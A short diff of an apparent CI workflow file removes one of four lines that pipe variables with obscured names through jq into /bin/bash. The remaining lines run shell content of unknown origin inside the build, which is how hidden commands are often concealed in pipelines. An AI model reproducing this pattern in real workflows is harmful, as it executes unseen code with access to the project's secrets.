@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$pgh51" | jq -r .ct72234 | /bin/bash
           echo $bauo5 | jq -r .h5669 | /bin/bash
-          echo $cfimk793 | jq -r .cbxm29 | /bin/bash
           echo $tstqo257 | jq -r .tkix9 | /bin/bash
 
       - name: Save data
